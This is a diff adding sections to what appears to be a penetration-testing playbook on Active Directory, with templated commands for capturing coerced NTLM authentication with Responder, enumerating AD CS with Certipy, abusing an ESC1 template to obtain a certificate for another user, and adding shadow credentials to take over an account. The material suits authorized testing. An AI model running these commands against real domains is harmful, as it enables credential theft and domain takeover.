@@ -53,3 +53,44 @@ SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --GPOName "Default Domai
 ```
 
 Confirm the GPO's scope links to an OU holding the target, then force a refresh or wait for policy application. [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse).
+
+## Capture coerced authentication
+
+Start Responder on the interface reachable from the target. Use a controlled service action or UNC path to trigger authentication; do not enable unrelated poisoning or DHCP features by default.
+
+```bash
+sudo responder -I '{{INTERFACE}}' -v
+```
+
+For an MSSQL trigger, use [xp_dirtree](services/databases#mssql-unc-authentication). Save the captured account and format, then use [NetNTLMv2 mode 5600](active-directory/credential-access#crack-a-captured-netntlmv2-response) when applicable. A capture does not prove relay access. [Responder quick start and SMB capture](https://github.com/lgandx/Responder).
+
+## Enumerate AD CS with Certipy
+
+Use a valid domain account and the confirmed DC. Enumerate enabled templates and CAs before choosing any request.
+
+```bash
+certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -text
+```
+
+Verify enrollment rights, authentication EKU, subject control, approval and signature requirements, CA permissions and strong mapping. A vulnerability label is a lead that still needs the listed conditions. [Certipy usage](https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage), [ESC conditions](https://posts.specterops.io/certified-pre-owned-d95910965cd2).
+
+## Request and use an ESC1 certificate
+
+Only after confirming ESC1 conditions. Set CA_HOST, CA, TEMPLATE, TARGET_USER and TARGET_SID from collected evidence. The request changes certificate state and must be within the authorized objective.
+
+```bash
+certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template '{{TEMPLATE}}' -upn '{{TARGET_USER}}@{{DOMAIN}}' -sid '{{TARGET_SID}}'
+certipy auth -pfx '{{TARGET_USER}}.pfx' -dc-ip '{{DC}}'
+```
+
+The second command expects the PFX filename produced by the request. Verify authentication rather than treating issuance as proof. If PKINIT fails, assess Schannel/LDAPS and strong mapping instead of repeating the same command. [Certipy find, req and auth workflow](https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage).
+
+## Shadow credentials with Certipy
+
+Use only when the current principal has verified write permission for msDS-KeyCredentialLink on TARGET_USER. This modifies the target object; record the change and remove added credentials when required by the engagement.
+
+```bash
+certipy shadow auto -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -account '{{TARGET_USER}}'
+```
+
+Use the generated credential to authenticate as the target identity. [Certipy shadow command](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference).
